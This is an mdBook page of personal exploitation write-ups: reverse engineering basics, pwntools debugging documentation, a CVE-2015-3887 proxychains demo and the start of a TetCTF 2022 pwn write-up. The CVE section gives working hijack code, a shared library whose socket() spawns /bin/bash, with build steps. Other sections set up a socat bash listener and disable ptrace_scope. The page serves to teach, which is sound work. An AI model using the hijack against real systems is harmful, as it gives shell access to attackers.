<!DOCTYPE HTML>
<html lang="en" class="sidebar-visible no-js light">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Exploitation Freaks</title>
        <meta name="robots" content="noindex" />
        <!-- Custom HTML head -->
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="icon" href="favicon.svg">
        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <link rel="stylesheet" href="css/print.css" media="print">
        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="fonts/fonts.css">
        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item expanded "><a href="introduction.html"><strong aria-hidden="true">1.</strong> Introduction</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.</strong> Exploitation</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="pwntools-debugging.html"><strong aria-hidden="true">2.1.</strong> Pwntools Debugging</a></li><li class="chapter-item expanded "><a href="cve-2015-3887.html"><strong aria-hidden="true">2.2.</strong> CVE-2015-3887</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.3.</strong> TetCTF 2022</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="newbie_tetctf.html"><strong aria-hidden="true">2.3.1.</strong> Newbie</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.4.</strong> Cyber Santa is Coming to Town</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="hackthebox-pwn-snowy.html"><strong aria-hidden="true">2.4.1.</strong> Mr Snowy</a></li><li class="chapter-item expanded "><a href="hackthebox-pwn-sleigh.html"><strong aria-hidden="true">2.4.2.</strong> Sleigh</a></li><li class="chapter-item expanded "><a href="hackthebox-pwn-naughty-list.html"><strong aria-hidden="true">2.4.3.</strong> Naughty List</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.5.</strong> ROPEmporium</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="ropemporium-split.html"><strong aria-hidden="true">2.5.1.</strong> Split</a></li></ol></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.</strong> Reverse Engineering</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="anatomy-of-a-gopher.html"><strong aria-hidden="true">3.1.</strong> Anatomy of a Gopher</a></li><li class="chapter-item expanded "><a href="gomalware-reversing-in-action.html"><strong aria-hidden="true">3.2.</strong> Go Malware Reverse Engineering with Kaspersky</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.3.</strong> Arizona State University Notes</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="pwn-college-embryoasm_level6.html"><strong aria-hidden="true">3.3.1.</strong> EmbryoASM Level 6</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell_level1.html"><strong aria-hidden="true">3.3.2.</strong> BabyShell Level 1</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell-level3.html"><strong aria-hidden="true">3.3.3.</strong> BabyShell Level 3</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell-level4.html"><strong aria-hidden="true">3.3.4.</strong> BabyShell Level 4</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell-level5.html"><strong aria-hidden="true">3.3.5.</strong> BabyShell Level 5</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell-level6.html"><strong aria-hidden="true">3.3.6.</strong> BabyShell Level 6</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell-level7.html"><strong aria-hidden="true">3.3.7.</strong> BabyShell Level 7</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell-level8.html"><strong aria-hidden="true">3.3.8.</strong> Babyshell Level 8</a></li><li class="chapter-item expanded "><a href="pwn-college-baby_reversing-5.html"><strong aria-hidden="true">3.3.9.</strong> BabyReverse Level 5</a></li><li class="chapter-item expanded "><a href="pwn-college-baby_reversing-10.html"><strong aria-hidden="true">3.3.10.</strong> BabyReverse Level 10</a></li><li class="chapter-item expanded "><a href="pwn-college-embryogdb-2.html"><strong aria-hidden="true">3.3.11.</strong> EmbryoGDB Level 2</a></li><li class="chapter-item expanded "><a href="pwn-college-embryogdb-3.html"><strong aria-hidden="true">3.3.12.</strong> EmbryoGDB Level 3</a></li><li class="chapter-item expanded "><a href="pwn-college-embryogdb-4.html"><strong aria-hidden="true">3.3.13.</strong> EmbryoGDB Level 4</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.4.</strong> Flare 8 (2021)</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="credchecker.html"><strong aria-hidden="true">3.4.1.</strong> credchecker</a></li></ol></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.</strong> Programming</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">4.1.</strong> The Linux Programming Interface</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="programming-tee.html"><strong aria-hidden="true">4.1.1.</strong> Exercise 4.1 (reproducing the tee linux binary)</a></li></ol></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.</strong> Other</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="half-handshake-crack.html"><strong aria-hidden="true">5.1.</strong> Half-Handshake Crack</a></li><li class="chapter-item expanded "><a href="tn-wn722n-monitor-mode.html"><strong aria-hidden="true">5.2.</strong> TN-WN722N Monitor Mode</a></li><li class="chapter-item expanded "><a href="awus036ach-monitor-mode.html"><strong aria-hidden="true">5.3.</strong> AWUS036ACH Monitor Mode</a></li><li class="chapter-item expanded "><a href="rpi-rtl88x2bu-evil-AP.html"><strong aria-hidden="true">5.4.</strong> RTL88x2bu Fake Access Point</a></li><li class="chapter-item expanded "><a href="windows-cheatsheet.html"><strong aria-hidden="true">5.5.</strong> Windows Cheatsheet</a></li></ol></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">Exploitation Freaks</h1>

                    <div class="right-buttons">
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>
                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="binary-exploitation-and-reverse-engineering"><a class="header" href="#binary-exploitation-and-reverse-engineering">Binary Exploitation and Reverse Engineering</a></h1>
<p><strong>First things first, welcome in my gitbook !</strong></p>
<p>I decided to make a mdbook so i can share writeups and exploits i found throughout time more easily online...</p>
<p>Hopefully you will enjoy it as much as i did enjoy making the page :)</p>
<p><strong>Time for Explanations !</strong>  Let's start with what is Reverse Engineering</p>
<h1 id="what-is-reverse-engineering-"><a class="header" href="#what-is-reverse-engineering-">What is Reverse Engineering ?</a></h1>
<p>To get a good definition of what is really Reverse Engineering i wen't on Wikipedia... Yeah i know pretty lame.</p>
<p><strong>Reverse engineering</strong> (also known as backwards engineering or back engineering) is a process or method through the application of which one attempts to <strong>understand through deductive reasoning how a device, process, system, or piece of software accomplishes a task with very little (if any) insight into exactly how it does so.</strong></p>
<p>In our case, we're <strong>Reverse Engineering programs (Binary Executables)</strong>, to do that we're using <strong>Decompilers, Debuggers, Disas, Hex Editors, PE Structure Analysis Tools and many more...</strong> note that you can reverse pretty much anything that has been engineered in the first place.</p>
<p><img src="https://c.tenor.com/K8R7LThju04AAAAC/hack-the-planet.gif" alt="alt" /></p>
<h1 id="why-reverse-engineering"><a class="header" href="#why-reverse-engineering">Why Reverse Engineering</a></h1>
<p>If you're into programming, Reverse Engineering might be one of the most important skills to improve your programming knowledge.</p>
<p>Looking at other people code was always one of the best, if not the best way to learn new programming techniques. Now we all know that C and C++ Programs goes through a big process (Preprocessing, Tokenization, Optimizations, Assembling, Linking,...) that basically change the textual code into a binary executable for the Operating System you want.</p>
<p><img src="https://files.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-Mk7MCiXZ7za0yxyehCg%2F-Mk7RfLlphCqkUO3SrCj%2F-Mk7Rv7gIyuteAZiRR4v%2Fimage.png?alt=media&amp;token=a8fa223b-1f37-4781-b07d-f7b42dfb80c1" alt="alt" /></p>
<p>Binary is a LOT more harder to understand and only a few binary ninjas are able to understand it, so unless the program is open-source you will potentially need to disassemble or decompile the binary, this is called Reverse Engineering, we take a compile executable (or binary), and we try to understand the code through either :</p>
<ul>
<li>
<p>Disassembly</p>
<ul>
<li>Disassembly is the act of disassembling an executable or binary into it's assembly representation, the disassembling process can't be 100% perfect and they might be some errors to fixed in the disassembled code.</li>
</ul>
</li>
<li>
<p>Decompiling</p>
<ul>
<li>Decompilation is the act of decompiling, we basically take a compiled binary and we tried to reverse that process to obtain a C / C++ representation of the binary or executable your currently analysing.</li>
</ul>
</li>
</ul>
<p>Knowing how to reverse a program will allow you to take any executable you want and look at what it does and how it truly does it things behind the scene.</p>
<p>Also Reverse Engineering, is useful for Malware Analysis, malwares uses a lot of different Obfuscation techniques, to make your life harder as an analyst, knowing how to counter these techniques and how to Deobfuscate programs will highly help you as a programmer.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="table-of-contents"><a class="header" href="#table-of-contents">Table of Contents</a></h1>
<ul>
<li><a href="pwntools-debugging.html#prerequisites">Prerequisites</a></li>
<li><a href="pwntools-debugging.html#launching-a-process-under-gdb">Launching a Process Under GDB</a></li>
<li><a href="pwntools-debugging.html#attaching-to-a-running-process">Attaching to a Running Process</a>
<ul>
<li><a href="pwntools-debugging.html#local-processes">Local Processes</a></li>
<li><a href="pwntools-debugging.html#forking-servers">Forking Servers</a></li>
</ul>
</li>
<li><a href="pwntools-debugging.html#debugging-foreign-architectures">Debugging Foreign Architectures</a></li>
<li><a href="pwntools-debugging.html#troubleshooting">Troubleshooting</a>
<ul>
<li><a href="pwntools-debugging.html#behind-the-scenes">Behind the Scenes</a></li>
<li><a href="pwntools-debugging.html#specifying-a-terminal-window">Specifying a Terminal Window</a></li>
<li><a href="pwntools-debugging.html#environment-variables">Environment Variables</a></li>
<li><a href="pwntools-debugging.html#unable-to-attach-to-processes">Unable to Attach to Processes</a></li>
<li><a href="pwntools-debugging.html#argv0-and-argc==0">argv0 and argc==0</a></li>
</ul>
</li>
</ul>
<p>Pwntools has rich support for using a debugger in your exploit workflow, and debuggers
are very useful when developing exploits when issues with exploits arise.</p>
<p>In addition to the resources here for debugging, you may want to enhance your GDB
experience with one of the following projects:</p>
<ul>
<li><a href="https://pwndbg.re">Pwndbg</a></li>
<li><a href="https://github.com/hugsy/gef">GDB Enhanced Features (GEF)</a></li>
</ul>
<h1 id="prerequisites"><a class="header" href="#prerequisites">Prerequisites</a></h1>
<p>You should have both <code>gdb</code> and <code>gdbserver</code> installed on your machine.
You can check this easily with <code>which gdb</code> or <code>which gdbserver</code>.</p>
<p>If you find that you don't have them installed, they can easily be installed from
most package managers.</p>
<pre><code class="language-sh">$ sudo apt-get install gdb gdbserver
</code></pre>
<h1 id="launching-a-process-under-gdb"><a class="header" href="#launching-a-process-under-gdb">Launching a Process Under GDB</a></h1>
<p>Launching a process under GDB while still being able to interact with that process
from pwntools is a tricky process, but luckily it's all been sorted out and the 
process is pretty seamless.</p>
<p>To launch a process under GDB from the very first instruction, just use 
<a href="https://docs.pwntools.com/en/stable/gdb.html#pwnlib.gdb.debug">gdb.debug</a>.</p>
<pre><code class="language-py">&gt;&gt;&gt; io = gdb.debug(&quot;/bin/bash&quot;, gdbscript='continue')
&gt;&gt;&gt; io.sendline('echo hello')
&gt;&gt;&gt; io.recvline()
# b'hello\n'
&gt;&gt;&gt; io.interactive()
</code></pre>
<p>This should automatically launch the debugger in a new window for you to interact
with.  If it does not, or you see an error about <code>context.terminal</code>, check out the
section on <a href="pwntools-debugging.html#specifying-a-terminal-window">Specifying a Terminal Window</a>.</p>
<p>In this example, we passed in <code>gdbscript='continue'</code> in order for the debugger
to resume execution, but you can pass in any valid GDB script commands and they
will be executed when the debugged process starts.</p>
<h1 id="attaching-to-a-running-process"><a class="header" href="#attaching-to-a-running-process">Attaching to a Running Process</a></h1>
<p>Sometimes you don't want to start your target under a debugger, but want to attach
to it at a certain stage in the exploitation process.<br />
This is also handled seamlessly by Pwntools.</p>
<h2 id="local-processes"><a class="header" href="#local-processes">Local Processes</a></h2>
<p>Generally, you will have created a <code>process()</code> tube in order to interact with the
target executable.  You can simply pass that to <code>gdb.attach()</code> and it will magically
open a new terminal window with the target binary under the debugger.</p>
<pre><code class="language-py">&gt;&gt;&gt; io = process('/bin/sh')
&gt;&gt;&gt; gdb.attach(io, gdbscript='continue')
</code></pre>
<p>A new window should appear, and you can continue to interact with the process
as you normally would from Pwntools.</p>
<h2 id="forking-servers"><a class="header" href="#forking-servers">Forking Servers</a></h2>
<p>Sometimes the binary you want to debug has a forking server, and you want to
debug the process you are connected to (rather than the server itself).  This
is also done seamlessly, as long as the server is running on the current machine.</p>
<p>Let's fake a server with socat!</p>
<pre><code class="language-py">&gt;&gt;&gt; socat = process(['socat', 'TCP-LISTEN:4141,reuseaddr,fork', 'EXEC:/bin/bash -i'])
</code></pre>
<p>Then we connect to the remote process with a <code>remote</code> tube as usual.</p>
<pre><code class="language-py">&gt;&gt;&gt; io = remote('localhost', 4141)
[x] Opening connection to localhost on port 4141
[x] Opening connection to localhost on port 4141: Trying 127.0.0.1
[+] Opening connection to localhost on port 4141: Done
&gt;&gt;&gt; io.sendline('echo hello')
&gt;&gt;&gt; io.recvline()
b'hello\n'
&gt;&gt;&gt; io.lport, io.rport
</code></pre>
<p>It works!  In order to debug the specific <code>bash</code> process our <code>remote</code> object, just
pass it to <code>gdb.attach()</code>.  Pwntools will look up the PID of the remote end of the 
connection and attempt to connect to it automatically.</p>
<pre><code class="language-py">&gt;&gt;&gt; gdb.attach(io)
</code></pre>
<p>A debugger should appear automatically, and you can interact with the process.</p>
<!-- TODO: This is currently broken, see https://github.com/Gallopsled/pwntools/issues/1589 -->
<h1 id="debugging-foreign-architectures"><a class="header" href="#debugging-foreign-architectures">Debugging Foreign Architectures</a></h1>
<p>Debugging foreign architectures (like ARM or PowerPC) from an Intel-based system is
as easy as running them under pwntools.</p>
<pre><code class="language-py">&gt;&gt;&gt; context.arch = 'arm'
&gt;&gt;&gt; elf = ELF.from_assembly(shellcraft.echo(&quot;Hello, world!\n&quot;) + shellcraft.exit())
&gt;&gt;&gt; process(elf.path).recvall()
b'Hello, world!\n'
</code></pre>
<p>Instead of invoking <code>process(...)</code> just use <code>gdb.debug(...)</code>.</p>
<pre><code class="language-py">&gt;&gt;&gt; gdb.debug(elf.path).recvall()
b'Hello, world!\n'
</code></pre>
<h2 id="tips-and-limitations"><a class="header" href="#tips-and-limitations">Tips and Limitations</a></h2>
<p>Processes running foreign architectures MUST be started with <code>gdb.debug</code> in order
to debug them, it is not possible to attach to a running process due to the way
that QEMU works.</p>
<p>It should be noted that QEMU has a very limited GDB stub, which is used to
inform GDB where various libraries are, so debugging may be more difficult,
and some commands will not work.</p>
<p>Pwntools recommends Pwndbg to handle this situation, since it has code specifically
to handle debugging under a QEMU stub.</p>
<!-- TODO: There is no tutorial for interacting with cross-arch binaries -->
<h1 id="troubleshooting"><a class="header" href="#troubleshooting">Troubleshooting</a></h1>
<h2 id="behind-the-scenes"><a class="header" href="#behind-the-scenes">Behind the Scenes</a></h2>
<p>Sometimes things just don't work, and you need to see what is happening internal
to Pwntools with the debugger setup.</p>
<p>You can set the logging context globally (via e.g. <code>context.log_level='debug'</code>)
or you can set it ONLY for the GDB session, via passing in the same argument.</p>
<p>You should see everything that's being handled for you behind the scenes.
For example:</p>
<pre><code class="language-py">&gt;&gt;&gt; io = gdb.debug('/bin/sh', log_level='debug')
[x] Starting local process '/home/user/bin/gdbserver' argv=[b'/home/user/bin/gdbserver', b'--multi', b'--no-disable-randomization', b'localhost:0', b'/bin/sh']
[+] Starting local process '/home/user/bin/gdbserver' argv=[b'/home/user/bin/gdbserver', b'--multi', b'--no-disable-randomization', b'localhost:0', b'/bin/sh'] : pid 34282
[DEBUG] Received 0x25 bytes:
    b'Process /bin/sh created; pid = 34286\n'
[DEBUG] Received 0x18 bytes:
    b'Listening on port 45145\n'
[DEBUG] Wrote gdb script to '/tmp/user/pwnxcd1zbyx.gdb'
    target remote 127.0.0.1:45145
[*] running in new terminal: /usr/bin/gdb -q  &quot;/bin/sh&quot; -x /tmp/user/pwnxcd1zbyx.gdb
[DEBUG] Launching a new terminal: ['/usr/local/bin/tmux', 'splitw', '/usr/bin/gdb -q  &quot;/bin/sh&quot; -x /tmp/user/pwnxcd1zbyx.gdb']
[DEBUG] Received 0x25 bytes:
    b'Remote debugging from host 127.0.0.1\n'
</code></pre>
<h2 id="specifying-a-terminal-window"><a class="header" href="#specifying-a-terminal-window">Specifying a Terminal Window</a></h2>
<p>Pwntools [attempts to launch a new window][run_in_new_terminal] to container your 
debugger based on whatever windowing system you are currently using.</p>
<p>By default, it auto-detects:</p>
<ul>
<li>tmux or screen</li>
<li>X11-based terminals like GNOME Terminal</li>
</ul>
<p>If you are not using a supported terminal environment, or it does not work in the
way you want (e.g. horizontal vs vertical splits) you can add support by setting
the <code>context.terminal</code> environment variable.</p>
<p>For example, the following will use TMUX to split horizontally instead of the default.</p>
<pre><code class="language-py">&gt;&gt;&gt; context.terminal = ['tmux', 'splitw', '-h']
</code></pre>
<p>Maybe you're a GNOME Terminal user and the default settings aren't working?</p>
<pre><code class="language-py">&gt;&gt;&gt; context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
</code></pre>
<p>You can specify any terminal you like, and can even put the setting inside
<code>~/.pwn.conf</code> so that it's used for all of you scripts!</p>
<pre><code>[context]
terminal=['x-terminal-emulator', '-e']
</code></pre>
<h2 id="environment-variables"><a class="header" href="#environment-variables">Environment Variables</a></h2>
<p>Pwntools allows you to specify any environment variables you like via <code>process()</code>,
and the same is true for <code>gdb.debug()</code>.</p>
<pre><code class="language-py">&gt;&gt;&gt; io = gdb.debug(['bash', '-c', 'echo $HELLO'], env={'HELLO': 'WORLD'})
&gt;&gt;&gt; io.recvline()
b'WORLD\n'
</code></pre>
<h3 id="cwd-and"><a class="header" href="#cwd-and"><code>CWD</code> and <code>   </code></a></h3>
<p>Unfortunately, when using <code>gdb.debug()</code>, the process is launched under <code>gdbserver</code>
which adds its own environment variables.  This may introduce complications when
the environment must be very carefully controlled.</p>
<pre><code class="language-py">&gt;&gt;&gt; io = gdb.debug(['env'], env={'FOO':'BAR'}, gdbscript='continue')
&gt;&gt;&gt; print(io.recvallS())
   =/home/user/bin/gdbserver
FOO=BAR

Child exited with status 0
GDBserver exiting
</code></pre>
<p>This only occurs when you launch the process under a debugger with <code>gdb.debug()</code>.
If you're able to start your process and <em>then</em> attach with <code>gdb.attach()</code>, you
can avoid this issue.</p>
<h3 id="environment-variable-ordering"><a class="header" href="#environment-variable-ordering">Environment Variable Ordering</a></h3>
<p>Some exploits may require that certain environment variables are in a specific
order.  Python2 dictionaries are not ordered, which may exacerbate this issue.</p>
<p>In order to have your environment variables in a specific order, we recommend
using Python3 (which orders dictionaries based on insertion order), or using
<code>collections.OrderedDict</code>.</p>
<h2 id="unable-to-attach-to-processes"><a class="header" href="#unable-to-attach-to-processes">Unable to Attach to Processes</a></h2>
<p>Modern Linux systems have a setting called <code>ptrace_scope</code> which prevents processes
that are not child processes from being debugged.  Pwntools works around this
for any processes that it launches itself, but if you have to launch a process
outside of Pwntools and try to attach to it by pid (e.g. <code>gdb.attach(1234)</code>),
you may be prevented from attaching.</p>
<p>You can resolve this by disabling the security setting and rebooting your machine:</p>
<pre><code class="language-sh">sudo tee /etc/sysctl.d/10-ptrace.conf &lt;&lt;EOF
kernel.yama.ptrace_scope = 0
EOF
</code></pre>
<h2 id="argv0-and-argc0"><a class="header" href="#argv0-and-argc0">argv0 and argc==0</a></h2>
<p>Some challenges require that they are launched with <code>argv[0]</code> set to a specific
value, or even that it's NULL (i.e. <code>argc==0</code>).</p>
<p>It is not possible to launch a processs with this configuration via <code>gdb.debug()</code>,
but you can use <code>gdb.attach()</code>.  This is because of limitations of launching
binaries under gdbserver.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="cve-2015-3887"><a class="header" href="#cve-2015-3887">CVE-2015-3887</a></h1>
<p>CVE-2015-3887,... we are dealing with a quite old exploit this time, but i wanted to take a look at the proxychains source code, to gain more programming knowledge.</p>
<p>After looking for a bit, i saw a <code>#define SUPER_SECURE</code> with a comment next to it saying &quot;<strong>CVE-2015-3887</strong>&quot;, so i decided to look, and it seemed like a pretty cool exploit to me.</p>
<h2 id="explanations"><a class="header" href="#explanations">Explanations</a></h2>
<p>The exploit is fairly simple and straight forward, the program looks for <code>libproxychains4.so</code> in the <strong>Current Path</strong> of the program instead of looking in the default <strong>libproxychains4.so</strong> directory which is in <strong>/usr/local/lib/libproxychains4.so</strong>...</p>
<p>This means we can write any code we wan't on our target machine, compile the code into a shared object using the following flags, in the following example i compile a file called <strong>payload.c</strong> into a <strong>libproxychains4.so</strong> :</p>
<p><code>gcc -shared -nostdlib -o libproxychains4.so payload.c</code></p>
<p>Next we would need to put the compiled file into the same directory where the <strong>proxychains</strong> binary is being ran from (<code>which proxychains</code> or <code>which proxychains4</code>).</p>
<h2 id="exploit-demo"><a class="header" href="#exploit-demo">Exploit demo</a></h2>
<ol>
<li>Compile the program <strong>with the ignore_cve flag on</strong>, so the program is vulnerable.</li>
</ol>
<pre><code class="language-bash">$ git clone https://github.com/rofl0r/proxychains-ng
$ cd proxychains-ng
$ vim configure (or nano if you prefer)

# find the &quot;ignore_cve&quot; field, and change it to &quot;yes&quot; (without quote marks), save and close the editor.

$ vim Makefile
$ :%/$(exec_prefix)/.
$ :%/$(prefix)/.        

# These 2 last commands will change every &quot;$(prefix)&quot; and &quot;$(exec_prefix)&quot; with &quot;.&quot;, since we only want to build proxychains in our current directory.

$ ./configure
$ make &amp;&amp; make install

# you should now have a compiled version of proxychains4 in the project directory (proxychains4-ng).
</code></pre>
<ol start="2">
<li>Write and Compile the exploit</li>
</ol>
<p>We're going to do things pretty simply, we are first going to look at libproxychains4 functions and see which one we can potentially hijack.</p>
<p>After looking for a minute i see the socket function, i am 100% sure the program will use this function in his runtime so i will hijack this one.</p>
<p>Let's write the exploit :)</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int socket(){
    system(&quot;/bin/bash&quot;);
    return 0;
}

</code></pre>
<p>Let's compile the exploit as a shared object</p>
<p><code>gcc -shared -nostdlib -o libproxychains4.so payload.c</code></p>
<ol start="3">
<li>Bypass the default libproxychains4.so using our exploit</li>
</ol>
<p>Just put the newly compiled file inside the same directory as the proxychains binary, make sure the name of the shared object is <strong>libproxychains4.so</strong> and you should get a shell...</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="newbie---tetctf-2022"><a class="header" href="#newbie---tetctf-2022">Newbie - TeTCTF 2022</a></h1>
<p>This challenge was the first pwn challenge i did from the TeTCTF 2022 event, the challenge was an awesome ret2libc with a stack canary bypass.</p>
<p>Thanks to amon for the help on this one, he showed me how easy it was to leak the stack canary in the current binary context.</p>
<h2 id="looking-at-the-binary"><a class="header" href="#looking-at-the-binary">Looking at the binary</a></h2>
<p>So here's how the program works, it first read 10 bytes from <code>/dev/urandom</code> and store them in an 16 bits unsigned integer array.</p>
<p>Then the program start a loop in which it asks us for an input, we have multiple input choice here are the 3 choices we have : <code>id </code>, <code>create </code>, <code>quit </code>. </p>
<p>If we enter <code>id </code> the program we look for the next characters and calls <code>atoi</code> on them, this part is vulnerable and will allow us to leak values on the stack.</p>
<p>If we enter <code>create</code>, the program will generate a hash using 32 rand calls, the last value entered in id is used ass seed for our rand calls, this function will also be used to leak stack values.</p>
<p>If we enter <code>quit</code>, the program will quit and hit the return of the main function, this is the part vulnerable to a buffer overflow.</p>
<h2 id="finding-the-main-function-in-the-stripped-binary"><a class="header" href="#finding-the-main-function-in-the-stripped-binary">Finding the main function in the stripped binary</a></h2>
<p>The binary is stripped hence a little harder to find the main part of our program, here's how i found the main function.</p>
<p>I first started the program in gdb, ran it once to have the right addresses used, then use the <code>info file</code> to find the entry point of our binary.</p>
<p>I then put a breakpoint at this location, then i can run the program. The program breaks at our breakpoint and we can see a bit of the current function.</p>
<pre><code>pwndbg&gt; b *0x5555554009c0
pwndbg&gt; r
─────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────
 ► 0x5555554009c0    xor    ebp, ebp
   0x5555554009c2    mov    r9, rdx
   0x5555554009c5    pop    rsi
   0x5555554009c6    mov    rdx, rsp
   0x5555554009c9    and    rsp, 0xfffffffffffffff0
   0x5555554009cd    push   rax
   0x5555554009ce    push   rsp
   0x5555554009cf    lea    r8, [rip + 0x4aa]
   0x5555554009d6    lea    rcx, [rip + 0x433]
   0x5555554009dd    lea    rdi, [rip + 0x3eb]
   0x5555554009e4    call   qword ptr [rip + 0x2015f6]    &lt;__libc_start_main&gt;
</code></pre>
<p>Looking at the DISASM output, we can notice that $rip+0x3eb is being put into rdi before the call to <code>__libc_start_main</code>, let's step until we're at address <code>0x5555554009dd</code> then disass the instructions at <code>$rip+0x3eb</code>.</p>
<pre><code>pwndbg&gt; x/10i $rip+0x3eb
   0x555555400dc8:      call   0x5555554008f0 &lt;__stack_chk_fail@plt&gt;
   0x555555400dcd:      leave  
   0x555555400dce:      ret    
   0x555555400dcf:      push   rbp
   0x555555400dd0:      mov    rbp,rsp
   0x555555400dd3:      sub    rsp,0x10
   0x555555400dd7:      mov    DWORD PTR [rbp-0x4],edi
   0x555555400dda:      mov    QWORD PTR [rbp-0x10],rsi
   0x555555400dde:      mov    eax,0x0
   0x555555400de3:      call   0x555555400b69

pwndbg&gt; b *0x555555400dcf
pwndbg&gt; del 1
</code></pre>
